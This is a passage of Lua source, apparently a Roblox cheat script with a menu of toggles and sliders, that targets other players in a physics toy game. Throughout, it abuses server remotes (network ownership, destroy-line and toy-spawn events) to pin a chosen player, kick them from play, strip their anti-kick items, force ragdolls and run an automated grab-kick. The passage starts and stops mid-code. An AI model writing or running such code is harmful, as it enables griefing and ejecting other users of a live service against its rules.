							local humanoidRootPart = character2 and character2:FindFirstChild("HumanoidRootPart")

							if not character2 or not humanoid or humanoid.Health <= 0 or not humanoidRootPart then
								if cFrame2 then
									character.CFrame = cFrame2
									fn15(character)
									cFrame2 = nil
									cFrame = nil
								end

								flag10 = false
								task.wait()
							else
								fn18(character2, true)
								fn16(character2)
								local flag11 = false

								for _, descendant in ipairs(character2:GetDescendants()) do
									if descendant.Name == "PartOwner" and descendant:IsA("StringValue") and descendant.Value == lp2.Name then
										flag11 = true
										break
									else
										flag11 = false
									end
								end

								if flag11 then
									if flag10 then
										flag10 = false

										if cFrame2 then
											character.CFrame = cFrame2
											fn15(character)
											cFrame2 = nil
											cFrame = nil
										end
									end
								elseif (humanoidRootPart.Position - (flag10 and cFrame2 and cFrame2.Position or character.Position)).Magnitude > 30 then
									if not flag10 then
										flag10 = true
										cFrame2 = character.CFrame
										cFrame = character.CFrame
									end

									character.CFrame = CFrame.new(humanoidRootPart.Position) * cf2(0, -15, 0)
									fn15(character)
								elseif flag10 then
									flag10 = false

									if cFrame2 then
										character.CFrame = cFrame2
										fn15(character)
										cFrame2 = nil
										cFrame = nil
									end
								end

								fn19(humanoidRootPart, (flag10 and cFrame2 and cFrame2.Position or character.Position) + v33(n25, n26, n27), character.CFrame.LookVector)
								task.wait()
							end
						end
					end
				end)

				table.insert(kickThreads, thread2)
				v19 = thread2

				local thread3 = task.spawn(function()
					while _G.kickEnabled and arg and arg.Parent do
						local humanoidRootPart = arg.Character and arg.Character:FindFirstChild("HumanoidRootPart")

						if humanoidRootPart then
							pcall(function()
								sno:FireServer(humanoidRootPart, humanoidRootPart.CFrame)
							end)
						end

						task.wait()
					end
				end)

				table.insert(kickThreads, thread3)

				if soundPart then
					local thread4 = task.spawn(function()
						while _G.kickEnabled and arg and arg.Parent do
							if not _G.noRagdollEnabled then
								local head = arg.Character and arg.Character:FindFirstChild("Head")

								if head then
									soundPart.CFrame = head.CFrame
								end
							end

							task.wait(0.1)
						end
					end)

					table.insert(kickThreads, thread4)
				end
			end

			local function fn18(arg, arg2)
				local soundPart = arg2 and arg2:FindFirstChild("SoundPart")
				local flag10 = false
				local cFrame2 = nil
				local v20 = nil

				local function fn19(arg3, arg4)
					for _, v21 in ipairs({ "Head", "Torso", "UpperTorso", "LowerTorso", "Left Arm", "Right Arm", "Left Leg", "Right Leg" }) do
						local v22 = arg3:FindFirstChild(v21)

						if v22 then
							if arg4 then
								fn15(v22)
								v22.CanCollide = false
								v22.CanTouch = false
							else
								v22.CanCollide = true
								v22.CanTouch = true
							end
						end
					end
				end

				local function fn20(parent, position, arg3)
					local kickHoldBP = parent:FindFirstChild("KickHoldBP")

					if not kickHoldBP then
						kickHoldBP = Instance.new("BodyPosition")
						kickHoldBP.Name = "KickHoldBP"
						kickHoldBP.Parent = parent
					end

					kickHoldBP.MaxForce = v33(math.huge, math.huge, math.huge)
					kickHoldBP.P = 50000
					kickHoldBP.D = 100
					kickHoldBP.Position = position
					local kickHoldBG = parent:FindFirstChild("KickHoldBG")

					if not kickHoldBG then
						local bodyGyro = Instance.new("BodyGyro")
						bodyGyro.Name = "KickHoldBG"
						bodyGyro.MaxTorque = v33(math.huge, math.huge, math.huge)
						bodyGyro.P = 50000
						bodyGyro.D = 100
						bodyGyro.Parent = parent
						kickHoldBG = bodyGyro
					end

					kickHoldBG.CFrame = CFrame.new(parent.Position, parent.Position + arg3)
				end

				local thread2 = task.spawn(function()
					while _G.kickEnabled and arg and arg.Parent do
						local character = lp2.Character
						character = character and character:FindFirstChild("HumanoidRootPart")

						if not character then
							task.wait()
						else
							local character2 = arg.Character
							local humanoid = character2 and character2:FindFirstChild("Humanoid")
							local humanoidRootPart = character2 and character2:FindFirstChild("HumanoidRootPart")

							if not character2 or not humanoid or humanoid.Health <= 0 or not humanoidRootPart then
								if cFrame2 then
									character.CFrame = cFrame2
									fn15(character)
									cFrame2 = nil
									cFrame = nil
								end

								flag10 = false
								task.wait()
							else
								fn19(character2, true)
								fn16(character2)
								local flag11 = false

								for _, descendant in ipairs(character2:GetDescendants()) do
									if descendant.Name == "PartOwner" and descendant:IsA("StringValue") and descendant.Value == lp2.Name then
										flag11 = true
										break
									else
										flag11 = false
									end
								end

								if flag11 then
									if flag10 then
										flag10 = false

										if cFrame2 then
											character.CFrame = cFrame2
											fn15(character)
											cFrame2 = nil
											cFrame = nil
										end
									end
								elseif (humanoidRootPart.Position - (flag10 and cFrame2 and cFrame2.Position or character.Position)).Magnitude > 30 then
									if not flag10 then
										flag10 = true
										cFrame2 = character.CFrame
										cFrame = character.CFrame
									end

									character.CFrame = CFrame.new(humanoidRootPart.Position) * cf2(0, -15, 0)
									fn15(character)
								elseif flag10 then
									flag10 = false

									if cFrame2 then
										character.CFrame = cFrame2
										fn15(character)
										cFrame2 = nil
										cFrame = nil
									end
								end

								local n28 = (flag10 and cFrame2 and cFrame2.Position or character.Position) + v33(n25, n26, n27)
								v20 = n28
								fn20(humanoidRootPart, n28, character.CFrame.LookVector)
								task.wait()
							end
						end
					end
				end)

				table.insert(kickThreads, thread2)
				v19 = thread2

				local thread3 = task.spawn(function()
					while _G.kickEnabled and arg and arg.Parent do
						local humanoidRootPart = arg.Character and arg.Character:FindFirstChild("HumanoidRootPart")

						if humanoidRootPart then
							pcall(function()
								sno:FireServer(humanoidRootPart, humanoidRootPart.CFrame)
							end)
						end

						task.wait()
					end
				end)

				table.insert(kickThreads, thread3)

				local thread4 = task.spawn(function()
					while _G.kickEnabled and arg and arg.Parent do
						local character = lp2.Character
						character = character and character:FindFirstChild("HumanoidRootPart")
						local humanoidRootPart = arg.Character and arg.Character:FindFirstChild("HumanoidRootPart")

						if character and humanoidRootPart and v20 then
							if (humanoidRootPart.Position - v20).Magnitude <= 1.5 then
								if (humanoidRootPart.Position - character.Position).Magnitude < 30 then
									pcall(function()
										_G.DestroyLine:FireServer(humanoidRootPart)
									end)
								end
							end
						end

						if _G.destroyLineWait > 0 then
							task.wait(_G.destroyLineWait)
						else
							task.wait()
						end
					end
				end)

				table.insert(kickThreads, thread4)

				if soundPart then
					local thread5 = task.spawn(function()
						while _G.kickEnabled and arg and arg.Parent do
							if not _G.noRagdollEnabled then
								local head = arg.Character and arg.Character:FindFirstChild("Head")

								if head then
									soundPart.CFrame = head.CFrame
								end
							end

							task.wait(0.1)
						end
					end)

					table.insert(kickThreads, thread5)
				end
			end

			local function fn19(arg, arg2)
				local userId = arg and arg.UserId

				local thread2 = task.spawn(function()
					while _G.kickEnabled and userId do
						local playerByUserId = ps2:GetPlayerByUserId(userId)

						if playerByUserId then
							local flag10 = arg2 == "Kick" or arg2 == "Lock"
							local flag11 = false

							if flag10 then
								local v20 = v19
								flag11 = not v20 or coroutine.status(v20) == "dead"
							end

							if flag11 then
								if arg2 == "Kick" then
									_G.kickEnabled = true
									fn18(playerByUserId, permanentPallet.currentPallet)
								elseif arg2 == "Lock" then
									_G.kickEnabled = true
									fn17(playerByUserId, permanentPallet.currentPallet)
								end
							end
						end

						task.wait()
					end
				end)

				table.insert(kickThreads, thread2)
			end

			local function fn20(arg)
				if not arg or not arg.Parent then
					return
				end
				kickPlayer = arg

				pcall(function()
					fn14()
					_G.kickEnabled = true

					if str5 == "Kick" then
						fn18(arg, permanentPallet.currentPallet)
					elseif str5 == "Lock" then
						fn17(arg, permanentPallet.currentPallet)
					end

					fn19(arg, str5)
				end)
			end

			v18:CreateDropdown({
				Name = "Destroy Method",
				Items = { "Kick", "Lock" },
				Default = "Kick",
				Callback = function(arg)
					if str5 == arg then
						return
					end
					str5 = arg

					if MainToggle and MainToggle.Get and MainToggle:Get() then
						fn14()
						_G.kickEnabled = true

						if str5 == "Kick" then
							fn18(selected2.kickPlayer, permanentPallet.currentPallet)
						elseif str5 == "Lock" then
							fn17(selected2.kickPlayer, permanentPallet.currentPallet)
						end

						fn19(selected2.kickPlayer, str5)
					end
				end,
			})

			_G.KickMethodsToggle = v18:CreateToggle({
				Name = "Enable Destroy Method",
				Default = false,
				Callback = function(arg)
					if arg then
						if not selected2.kickPlayer or not selected2.kickPlayer.Parent then
							MainToggle:Set(false)
							return
						end

						if str5 == "Kick" or str5 == "Lock" then
							if not permanentPallet.enabled or not permanentPallet.currentPallet then
								MainToggle:Set(false)
								return
							end
						end

						fn14()
						kickPlayer = selected2.kickPlayer

						if thread then
							task.cancel(thread)
						end

						thread = task.spawn(function()
							while true do
								if _G.kickEnabled then
									local kickPlayer2 = selected2.kickPlayer

									if kickPlayer2 and kickPlayer2.Parent and kickPlayer2 ~= kickPlayer then
										fn20(kickPlayer2)
									end
								end

								task.wait()
							end
						end)

						if str5 == "Kick" then
							_G.kickEnabled = true
							fn18(selected2.kickPlayer, permanentPallet.currentPallet)
						elseif str5 == "Lock" then
							_G.kickEnabled = true
							fn17(selected2.kickPlayer, permanentPallet.currentPallet)
						end

						fn19(selected2.kickPlayer, str5)
					else
						if thread then
							task.cancel(thread)
							thread = nil
						end

						kickPlayer = nil
						fn14()
					end
				end,
			})

			v18:CreateSection("Destroy Line Delay [Kick only]")

			v18:CreateSlider({
				Name = "Delay (0 = fastest | 0.02 = slowest)",
				Min = 0,
				Max = 0.02,
				Default = 0.01,
				DecimalPlaces = 3,
				Callback = function(destroyLineWait)
					_G.destroyLineWait = destroyLineWait
				end,
			})

			v18:CreateToggle({
				Name = "No ragdoll [Kick / Lock only]",
				Default = true,
				Flag = "NoRagdollKick",
				Callback = function(noRagdollEnabled)
					_G.noRagdollEnabled = noRagdollEnabled
				end,
			})

			v18:CreateSection("Fix Position Offset")

			v18:CreateSlider({
				Name = "X Offset",
				Min = -10,
				Max = 10,
				Default = 0,
				Callback = function(arg)
					n25 = arg
				end,
			})

			v18:CreateSlider({
				Name = "Y Offset",
				Min = -20,
				Max = 20,
				Default = 20,
				Callback = function(arg)
					n26 = arg
				end,
			})

			v18:CreateSlider({
				Name = "Z Offset",
				Min = -10,
				Max = 10,
				Default = 5,
				Callback = function(arg)
					n27 = arg
				end,
			})
		end

		_G.RemoveBlock = _G.TargetTab:CreateBlock({ Name = "Removed", Side = "Right", ImageID = "91348301820267" })
		local removeBlock
		removeBlock = _G.RemoveBlock
		local ws2
		ws2 = _G.WS
		local lp2
		lp2 = _G.LP
		local selected3, rs2, str5, grabEvents

		do
			local repS = _G.RepS
			selected3 = _G.Selected
			local ps2 = _G.PS
			rs2 = _G.RS or game:GetService("RunService")
			str5 = "Aura"
			local tbl6 = { "Aura", "Inventory" }
			local flag9 = false
			local thread = nil
			local name = lp2.Name
			grabEvents = repS:FindFirstChild("GrabEvents")
			local setNetworkOwner = grabEvents and grabEvents:FindFirstChild("SetNetworkOwner")
			grabEvents = grabEvents and grabEvents:FindFirstChild("SetNetworkOwner")
			local kickPlayer = nil
			local connection3 = nil
			local flag10 = false
			local thread2 = nil
			local n25 = 35
			local cframe = CFrame.new(0, 1e9, 1e9)

			local tbl7 = {
				NinjaKunai = true,
				ToolPickaxe = true,
				ToolPencil = true,
				NinjaShuriken = true,
				AntiKick = true,
				ToolDiggingForkRusty = true,
				ToolCleaver = true,
				AntiKickCleaver = true,
			}

			local function fn14(arg)
				if not arg then
					return false
				end
				local v19 = string.lower(arg.Name)
				return v19 == "creatureblobman" or v19:find("blobman") ~= nil
			end

			local function fn15(arg)
				if connection3 then
					connection3:Disconnect()
					connection3 = nil
				end

				if not arg then
					return
				end

				connection3 = ps2.PlayerAdded:Connect(function(player)
					if player ~= arg then
						return
					end

					if player ~= kickPlayer then
						return
					end
				end)
			end

			local function fn16(arg)
				if not arg then
					return
				end

				if not arg.Character then
					return
				end
				local v19 = ws2:FindFirstChild(arg.Name .. "SpawnedInToys")
				if not v19 then
					return
				end
				local character = lp2.Character
				character = character and character:FindFirstChild("HumanoidRootPart")
				if not character then
					return
				end
				local position = character.Position

				for _, child in ipairs(v19:GetChildren()) do
					if not fn14(child) then
						if tbl7[child.Name] then
							local soundPart = child:FindFirstChild("SoundPart") or child:FindFirstChildWhichIsA("BasePart")

							if soundPart and (position - soundPart.Position).Magnitude <= n25 then
								pcall(function()
									if setNetworkOwner then
										setNetworkOwner:FireServer(soundPart, soundPart.CFrame)
									end
								end)

								local partOwner = soundPart:FindFirstChild("PartOwner")

								if partOwner and partOwner.Value == name then
									soundPart.CFrame = cframe
								end
							end
						end
					end
				end
			end

			local function fn17()
				local character = lp2.Character
				local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
				if not humanoidRootPart then
					return
				end
				local position = humanoidRootPart.Position

				for _, child in ipairs(ws2:GetChildren()) do
					local name2 = child.Name

					if name2:find("SpawnedInToys$") and name2 ~= name .. "SpawnedInToys" then
						for _, child2 in ipairs(child:GetChildren()) do
							if not fn14(child2) then
								if tbl7[child2.Name] then
									local soundPart = child2:FindFirstChild("SoundPart") or child2:FindFirstChildWhichIsA("BasePart")

									if soundPart and (position - soundPart.Position).Magnitude <= n25 then
										pcall(function()
											if setNetworkOwner then
												setNetworkOwner:FireServer(soundPart, soundPart.CFrame)
											end
										end)

										local partOwner = soundPart:FindFirstChild("PartOwner")

										if partOwner and partOwner.Value == name then
											soundPart.CFrame = cframe
										end
									end
								end
							end
						end
					end
				end
			end

			local function fn18(arg)
				local tbl8 = {}
				if not arg then
					return tbl8
				end

				if arg:IsA("BasePart") then
					table.insert(tbl8, arg)
				end

				for _, descendant in pairs(arg:GetDescendants()) do
					if descendant:IsA("BasePart") then
						table.insert(tbl8, descendant)
					end
				end

				return tbl8
			end

			local function fn19(arg)
				if not arg then
					return
				end

				if not arg.Character then
					return
				end
				local v19 = ws2:FindFirstChild(arg.Name .. "SpawnedInToys")
				if not v19 then
					return
				end
				local character = lp2.Character
				local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
				if not humanoidRootPart then
					return
				end
				local position = humanoidRootPart.Position

				for _, child in ipairs(v19:GetChildren()) do
					if not fn14(child) then
						local v20 = fn18(child)

						for _, v21 in ipairs(v20) do
							if v21 and v21:IsA("BasePart") and v21.Parent then
								if (position - v21.Position).Magnitude <= n25 then
									pcall(function()
										if setNetworkOwner then
											setNetworkOwner:FireServer(v21, v21.CFrame)
										end
									end)

									local partOwner = v21:FindFirstChild("PartOwner")

									if partOwner and partOwner.Value == name then
										v21.CFrame = cframe
									end
								end
							end
						end
					end
				end
			end

			local function fn20()
				if thread then
					task.cancel(thread)
					thread = nil
				end

				if not flag9 then
					return
				end

				if str5 == "Inventory" then
					thread = task.spawn(function()
						while flag9 do
							local kickPlayer2 = selected3.kickPlayer

							if kickPlayer2 ~= kickPlayer then
								kickPlayer = kickPlayer2
								fn15(kickPlayer)
							end

							if kickPlayer then
								pcall(function()
									fn16(kickPlayer)
								end)
							end

							task.wait(0.2)
						end
					end)
				else
					thread = task.spawn(function()
						while flag9 do
							pcall(function()
								fn17()
							end)

							task.wait(0.2)
						end
					end)
				end
			end

			removeBlock:CreateDropdown({
				Name = "Remove Method",
				Items = tbl6,
				Default = "Aura",
				Callback = function(arg)
					str5 = arg

					if flag9 then
						fn20()
					end
				end,
			})

			removeBlock:CreateToggle({
				Name = "Remove Anti-Kick",
				Default = false,
				Callback = function(arg)
					flag9 = arg

					if thread then
						task.cancel(thread)
						thread = nil
					end

					if connection3 then
						connection3:Disconnect()
						connection3 = nil
					end

					if flag9 then
						fn20()
					else
						kickPlayer = nil
					end
				end,
			})

			local str6 = "Inventory"

			local function fn21()
				local character = lp2.Character
				local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
				if not humanoidRootPart then
					return
				end
				local position = humanoidRootPart.Position

				for _, child in ipairs(ws2:GetChildren()) do
					local name2 = child.Name

					if name2:find("SpawnedInToys$") and name2 ~= name .. "SpawnedInToys" then
						for _, child2 in ipairs(child:GetChildren()) do
							if not fn14(child2) then
								local v19 = fn18(child2)

								for _, v20 in ipairs(v19) do
									if v20 and v20:IsA("BasePart") and v20.Parent then
										if (position - v20.Position).Magnitude <= n25 then
											pcall(function()
												if setNetworkOwner then
													setNetworkOwner:FireServer(v20, v20.CFrame)
												end
											end)

											local partOwner = v20:FindFirstChild("PartOwner")

											if partOwner and partOwner.Value == name then
												v20.CFrame = cframe
											end
										end
									end
								end
							end
						end
					end
				end
			end

			local function fn22()
				if thread2 then
					task.cancel(thread2)
					thread2 = nil
				end

				if not flag10 then
					return
				end

				thread2 = task.spawn(function()
					while flag10 do
						local kickPlayer2 = selected3.kickPlayer

						if str6 == "Inventory" then
							if kickPlayer2 then
								pcall(function()
									fn19(kickPlayer2)
								end)
							end
						else
							pcall(function()
								fn21()
							end)
						end

						task.wait(0.2)
					end
				end)
			end

			removeBlock:CreateDropdown({
				Name = "Remove All toy Method",
				Items = { "Inventory", "Aura" },
				Default = "Inventory",
				Callback = function(arg)
					str6 = arg

					if flag10 then
						fn22()
					end
				end,
			})

			removeBlock:CreateToggle({
				Name = "Remove All toy",
				Default = false,
				Callback = function(arg)
					flag10 = arg

					if flag10 then
						fn22()
					elseif thread2 then
						task.cancel(thread2)
						thread2 = nil
					end
				end,
			})

			local function fn23()
				if flag9 and str5 == "Inventory" then
					if selected3.kickPlayer then
						kickPlayer = selected3.kickPlayer
						fn15(kickPlayer)
					end
				end
			end

			if _G.Selected and _G.Selected.updateCallback then
				table.insert(_G.Selected.updateCallback, fn23)
			end

			rs2.Heartbeat:Connect(function()
				if flag9 and str5 == "Inventory" and not thread then
					fn20()
				end
			end)
		end

		do
			local function fn14(arg)
				if not arg or not arg.Parent then
					return
				end
				local character = lp2.Character
				local humanoid = character and character:FindFirstChildOfClass("Humanoid")
				character = character and character:FindFirstChild("HumanoidRootPart")
				if not humanoid or not character then
					return
				end

				local function fn15()
					character.Velocity = Vector3.zero
					character.AssemblyLinearVelocity = Vector3.zero
				end

				local cFrame = character.CFrame
				character.CFrame = arg.CFrame * CFrame.new(0, 0, 0)
				task.wait()
				arg:Sit(humanoid)
				task.wait()
				humanoid.Sit = false

				for i = 1, 25 do
					humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
					task.wait(0.005)
				end

				fn15()
				character.CFrame = cFrame
				task.wait()
				fn15()
			end

			local flag9 = false

			removeBlock:CreateKeybind({
				Name = "Remove Gucci",
				Default = Enum.KeyCode.Five,
				Callback = function()
					local kickPlayer = selected3.kickPlayer
					if not kickPlayer then
						return
					end
					local character = lp2.Character
					local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
					if not humanoidRootPart then
						return
					end
					character = character and character:FindFirstChildOfClass("Humanoid")
					local cFrame = humanoidRootPart.CFrame

					if flag9 then
						local character2 = kickPlayer.Character
						local humanoidRootPart2 = character2 and character2:FindFirstChild("HumanoidRootPart")

						if humanoidRootPart2 then
							local now2 = tick()
							local connection3 = nil

							connection3 = rs2.Heartbeat:Connect(function()
								if not flag9 or tick() - now2 >= 1 or not humanoidRootPart2.Parent then
									if connection3 then
										connection3:Disconnect()
									end

									return
								end

								humanoidRootPart.CFrame = humanoidRootPart2.CFrame + Vector3.new(0, -10, 0)

								if grabEvents then
									task.spawn(function()
										for i = 1, 25 do
											local humanoidRootPart3 = kickPlayer.Character and kickPlayer.Character:FindFirstChild("HumanoidRootPart")

											if humanoidRootPart3 then
												pcall(function()
													grabEvents:FireServer(humanoidRootPart3, humanoidRootPart3.CFrame)
												end)
											end

											task.wait()
										end
									end)
								end
							end)

							task.wait(1)

							if connection3 then
								connection3:Disconnect()
							end
						end
					end

					local v19 = ws2:FindFirstChild(kickPlayer.Name .. "SpawnedInToys")

					if v19 then
						for _, descendant in ipairs(v19:GetDescendants()) do
							if descendant:IsA("VehicleSeat") then
								if character then
									for i = 1, 5 do
										character.Sit = true
										task.wait(0.01)
										character.Sit = false
									end

									task.wait(0.2)
								end

								fn14(descendant)
							end
						end
					end

					humanoidRootPart.CFrame = cFrame
					humanoidRootPart.Velocity = Vector3.zero
					humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
				end,
			})

			removeBlock:CreateToggle({
				Name = "Inf Ragdoll [wait 1 second]",
				Default = false,
				Callback = function(arg)
					flag9 = arg
				end,
			})
		end

		_G.BlobmanDestroyBlock = _G.TargetTab:CreateBlock({ Name = "Blobman Destroy method", Side = "Left", ImageID = "9728118892" })
		local blobmanDestroyBlock
		blobmanDestroyBlock = _G.BlobmanDestroyBlock
		local playSound
		playSound = _G.PlaySound
		local sounds
		sounds = _G.Sounds
		local lp3
		lp3 = _G.LP
		local ws3
		ws3 = _G.WS
		local ps2
		ps2 = _G.PS
		local sno
		sno = _G.SNO
		local destroyLine
		destroyLine = _G.DestroyLine
		local cf2
		cf2 = _G.CF
		local v33
		v33 = _G.V3
		local RunService, v19, spawn_, cancel, selected4, str6, flag9, tbl6, v20, kickPlayer
		local v21, flag10

		do
			local repS = _G.RepS or game:GetService("ReplicatedStorage")
			RunService = game:GetService("RunService")
			v19 = tick
			spawn_ = task.spawn
			cancel = task.cancel
			selected4 = _G.Selected
			str6 = "Blob Kick"
			flag9 = false
			tbl6 = {}
			v20 = nil
			kickPlayer = nil
			v21 = nil
			flag10 = false
			local connection3 = nil
			local vector = Vector3.zero

			local tbl7 = {
				"Left Leg",
				"Right Leg",
				"Left Arm",
				"Right Arm",
				"Head",
				"Torso",
				"HumanoidRootPart",
			}

			local tbl8 = {}
			local tbl9 = {}

			local function fn14()
				return v20 and v20.Parent ~= nil
			end

			local function fn15(arg)
				if arg then
					arg.Velocity = vector
					arg.AssemblyLinearVelocity = vector
					arg.RotVelocity = vector
					arg.AssemblyAngularVelocity = vector
				end
			end

			local function fn16(arg)
				if not arg then
					return
				end
				local humanoidRootPart = arg:FindFirstChild("HumanoidRootPart")

				if humanoidRootPart then
					fn15(humanoidRootPart)
				end

				for _, v22 in ipairs(tbl7) do
					local v23 = arg:FindFirstChild(v22)

					if v23 then
						fn15(v23)
					end
				end
			end

			local function fn17(arg, arg2)
				if not arg then
					return
				end

				for _, v22 in ipairs({
					"Head",
					"HumanoidRootPart",
					"Torso",
					"UpperTorso",
					"LowerTorso",
					"Left Arm",
					"Right Arm",
					"Left Leg",
					"Right Leg",
					"LeftUpperArm",
					"LeftLowerArm",
					"LeftHand",
					"RightUpperArm",
					"RightLowerArm",
					"RightHand",
					"LeftUpperLeg",
					"LeftLowerLeg",
					"LeftFoot",
					"RightUpperLeg",
					"RightLowerLeg",
					"RightFoot",
				}) do
					local v23 = arg:FindFirstChild(v22)

					if v23 and v23:IsA("BasePart") then
						if arg2 then
							fn15(v23)
							v23.CanCollide = false
							v23.CanTouch = false
						else
							v23.CanCollide = true
							v23.CanTouch = true
						end
					end
				end
			end

			local function fn18(arg)
				if not arg then
					return
				end
				local character = arg.Character

				if character then
					fn17(character, false)
					tbl8[character] = nil
					tbl9[character] = nil
					local humanoid = character:FindFirstChild("Humanoid")

					if humanoid then
						humanoid.PlatformStand = false
						humanoid.Sit = false
						humanoid.AutoRotate = true
					end

					local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")

					if humanoidRootPart then
						fn15(humanoidRootPart)
						local blobKickBodyPos = humanoidRootPart:FindFirstChild("BlobKickBodyPos")

						if blobKickBodyPos then
							blobKickBodyPos:Destroy()
						end

						local blobKickBodyGyro = humanoidRootPart:FindFirstChild("BlobKickBodyGyro")

						if blobKickBodyGyro then
							blobKickBodyGyro:Destroy()
						end

						local blobKickAntiGravity = humanoidRootPart:FindFirstChild("BlobKickAntiGravity")

						if blobKickAntiGravity then
							blobKickAntiGravity:Destroy()
						end

						local blobKickBodyVelocity = humanoidRootPart:FindFirstChild("BlobKickBodyVelocity")

						if blobKickBodyVelocity then
							blobKickBodyVelocity:Destroy()
						end
					end

					for _, v22 in ipairs(tbl7) do
						local v23 = character:FindFirstChild(v22)

						if v23 then
							v23.CanCollide = true
							v23.CanTouch = true
						end
					end
				end
			end

			local function fn19(arg)
				if not arg then
					return nil
				end
				local blobmanSeatAndOwnerScript = arg:FindFirstChild("BlobmanSeatAndOwnerScript")
				if not blobmanSeatAndOwnerScript then
					return nil
				end
				local creatureGrab = blobmanSeatAndOwnerScript:FindFirstChild("CreatureGrab")
				local creatureRelease = blobmanSeatAndOwnerScript:FindFirstChild("CreatureRelease") or blobmanSeatAndOwnerScript:FindFirstChild("CreatureDrop")
				local leftDetector = arg:FindFirstChild("LeftDetector")
				local leftWeld = leftDetector and leftDetector:FindFirstChild("LeftWeld")
				local rightDetector = arg:FindFirstChild("RightDetector")
				local rightWeld = rightDetector and rightDetector:FindFirstChild("RightWeld")
				if creatureGrab and creatureRelease and leftDetector and leftWeld and rightDetector and rightWeld then
					return { grab = creatureGrab, release = creatureRelease, leftDet = leftDetector, leftWeld = leftWeld, rightDet = rightDetector, rightWeld = rightWeld }
				end
				return nil
			end

			local function fn20()
				local character = lp3.Character
				if not character then
					return false
				end
				local humanoid = character:FindFirstChild("Humanoid")
				if not humanoid or humanoid.Health <= 0 then
					return false
				end
				local seatPart = humanoid.SeatPart
				if not seatPart or not seatPart:IsDescendantOf(ws3) then
					return false
				end
				local creatureBlobman = seatPart:FindFirstAncestor("CreatureBlobman")
				if not creatureBlobman or not creatureBlobman.Parent then
					return false
				end
				v20 = creatureBlobman
				return true
			end

			local function fn21()
				for _, v22 in ipairs(tbl6) do
					if v22 then
						cancel(v22)
					end
				end

				tbl6 = {}

				if v21 then
					cancel(v21)
					v21 = nil
				end
			end

			local function fn22()
				local v22 = ws3:FindFirstChild(lp3.Name .. "SpawnedInToys")

				if v22 then
					for _, child in pairs(v22:GetChildren()) do
						if child.Name == "CreatureBlobman" and child.Parent then
							return child
						end
					end
				end

				return nil
			end

			local function fn23()
				local v22 = fn22()
				if v22 then
					return v22
				end
				local canSpawnToy = lp3:FindFirstChild("CanSpawnToy")

				if canSpawnToy and not canSpawnToy.Value then
					local v23 = v19()

					while not canSpawnToy.Value and v19() - v23 < 2 do
						task.wait()
					end
				end

				local spawnToyRemoteFunction = repS:FindFirstChild("MenuToys") and repS.MenuToys:FindFirstChild("SpawnToyRemoteFunction")
				local humanoidRootPart = lp3.Character and lp3.Character:FindFirstChild("HumanoidRootPart")
				if not spawnToyRemoteFunction or not humanoidRootPart then
					return nil
				end
				local n25 = humanoidRootPart.CFrame * cf2(0, 20, 20)

				task.spawn(function()
					pcall(function()
						spawnToyRemoteFunction:InvokeServer("CreatureBlobman", n25, v33(0, 0, 0))
					end)
				end)

				local v23 = v19()
				local v24 = nil

				while not v24 and v19() - v23 < 3 do
					v24 = fn22()

					if not v24 then
						task.wait()
					end
				end

				return v24
			end

			local function fn24()
				if connection3 then
					connection3:Disconnect()
				end

				connection3 = RunService.RenderStepped:Connect(function()
					if not flag10 then
						return
					end
					local character = lp3.Character
					if not character then
						return
					end
					local humanoid = character:FindFirstChild("Humanoid")
					local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
					if not humanoid or not humanoidRootPart or humanoid.Health <= 0 then
						return
					end
					local seatPart = humanoid.SeatPart

					if not seatPart or not seatPart:IsDescendantOf(ws3) then
						local v22 = fn23()

						if v22 then
							local vehicleSeat = v22:FindFirstChild("VehicleSeat")

							if vehicleSeat then
								humanoidRootPart.CFrame = vehicleSeat.CFrame * cf2(0, 2, 0)
								fn15(humanoidRootPart)

								pcall(function()
									vehicleSeat:Sit(humanoid)
								end)
							end
						end
					end
				end)
			end

			local function fn25()
				if connection3 then
					connection3:Disconnect()
					connection3 = nil
				end
			end

			local function fn26(arg)
				local n25 = 0.15
				local n26 = 30
				local flag11 = false
				local v22 = nil
				local v23 = nil
				local bodyPosition = nil
				local bodyGyro = nil
				local flag12 = false
				local tbl10 = {}
				local cFrame = nil
				local flag13 = false
				local n27 = nil

				local function fn27()
					if bodyPosition then
						bodyPosition:Destroy()
						bodyPosition = nil
					end

					if bodyGyro then
						bodyGyro:Destroy()
						bodyGyro = nil
					end

					flag11 = false
					flag12 = false
				end

				local v24 = spawn_(function()
					while flag9 do
						if not fn20() then
							if v23 then
								fn27()
								local character = arg.Character

								if character then
									fn17(character, false)
									tbl8[character] = nil
									tbl9[character] = nil
									local humanoid = character:FindFirstChild("Humanoid")

									if humanoid then
										humanoid.PlatformStand = false
										humanoid.Sit = false
									end

									local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")

									if humanoidRootPart then
										fn15(humanoidRootPart)
									end
								end
							end

							flag12 = false
							flag11 = false
							v22 = nil
							n27 = nil
							v23 = nil
						end

						task.wait()
					end
				end)

				table.insert(tbl10, v24)

				local v25 = spawn_(function()
					while flag9 and arg and arg.Parent do
						if not fn20() then
							fn18(arg)
							fn27()
							flag12 = false
							flag11 = false
							v22 = nil
							n27 = nil
							v23 = nil
							flag13 = false
							cFrame = nil
							task.wait()
						else
							local character = lp3.Character

							if not character then
								task.wait()
							else
								local humanoid = character:FindFirstChild("Humanoid")

								if not humanoid or humanoid.Health <= 0 then
									task.wait()
								else
									local v25 = fn19(v20)

									if not v25 then
										task.wait()
									else
										local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")

										if not humanoidRootPart then
											task.wait()
										else
											if not flag13 then
												cFrame = humanoidRootPart.CFrame
											end

											local character2 = arg.Character
											local humanoid2 = character2 and character2:FindFirstChild("Humanoid")
											local humanoidRootPart2 = character2 and character2:FindFirstChild("HumanoidRootPart")

											if not character2 or not humanoid2 or humanoid2.Health <= 0 or not humanoidRootPart2 then
												if character2 then
													fn17(character2, false)
													tbl8[character2] = nil
													tbl9[character2] = nil
												end

												fn27()

												if flag13 and cFrame then
													humanoidRootPart.CFrame = cFrame * cf2(0, 3.5, 0)
													fn15(humanoidRootPart)
													fn16(character)
													flag13 = false
													cFrame = nil
												end

												task.wait()
											else
												tbl8[character2] = true
												tbl9[character2] = true
												fn17(character2, true)

												for k in pairs(tbl8) do
													if k and k.Parent and tbl9[k] then
